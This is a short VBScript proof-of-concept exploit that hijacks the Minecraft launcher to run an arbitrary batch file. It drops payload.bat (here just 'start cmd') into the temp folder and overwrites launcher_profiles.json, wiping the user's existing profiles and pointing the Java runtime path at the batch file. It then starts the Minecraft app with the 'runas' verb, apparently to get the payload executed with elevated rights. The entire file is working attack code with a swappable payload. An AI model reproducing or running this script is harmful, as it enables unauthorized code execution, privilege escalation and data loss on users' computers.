Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set App = CreateObject("Shell.Application")

MC = Shell.expandEnvironmentStrings("%appdata%") + "\.minecraft\launcher_profiles.json"
Temp = Shell.expandEnvironmentStrings("%temp%") + "\payload.bat"

Payload = "start cmd"

Set File = FSO.CreateTextFile(Temp, true)
File.WriteLine(Payload)

Profiles = "{""profiles"":{""release"":{""created"":""1970-01-02T00:00:00.000Z"",""icon"":""Grass"",""javaDir"":""<RUNTIME>"",""lastUsed"":""1970-01-02T00:00:00.000Z"",""lastVersionId"":""latest-release"",""name"":"""",""type"":""latest-release""},""snapshot"":{""created"":""1970-01-01T00:00:00.000Z"",""icon"":""Dirt"",""javaDir"":""<RUNTIME>"",""lastUsed"":""1970-01-01T00:00:00.000Z"",""lastVersionId"":""latest-snapshot"",""name"":"""",""type"":""latest-snapshot""}},""settings"":{""crashAssistance"":true,""enableAdvanced"":false,""enableAnalytics"":true,""enableHistorical"":false,""enableReleases"":true,""enableSnapshots"":false,""keepLauncherOpen"":false,""profileSorting"":""ByLastPlayed"",""showGameLog"":false,""showMenu"":false,""soundOn"":false},""version"":3}"

Profiles = Replace(Profiles, "<RUNTIME>", Replace(Temp, "\", "\\"))

Set File2 = FSO.CreateTextFile(MC, true)
File2.WriteLine(Profiles)

App.ShellExecute "shell:AppsFolder\Microsoft.4297127D64EC6_8wekyb3d8bbwe!Minecraft", , , "runas"
